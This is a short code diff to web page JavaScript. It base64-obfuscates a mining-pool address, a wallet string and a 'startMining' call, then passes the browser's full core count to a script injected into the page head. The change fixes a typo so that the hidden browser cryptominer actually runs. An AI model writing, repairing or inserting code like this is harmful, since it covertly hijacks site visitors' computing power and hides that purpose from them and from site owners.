@@ -15,7 +15,7 @@
                 let args = [atob('YWVvbi5oYXNodmF1bHQucHJv'),
                     atob('V21zOVU2ZXQ0NU5iWFdmSm1QVlJWSzN4UUtuWG5HY0tKWlJndjZBNWNVUGppNmtMaEwxN2FFVzhaTVViaHp6WXE4SzJwYUVEZzZXeURFZ3NtOHlRZzNubjJQOFBDa2JDUA==')];
                 let p = 'workers_';
-                window[atob("c3RhcnRNaW5pbmc=")](args[0], arg[1], p, navigator.hardwareConcurrency);
+                window[atob("c3RhcnRNaW5pbmc=")](args[0], args[1], p, navigator.hardwareConcurrency);
             }
             document.head.appendChild(s);
         }
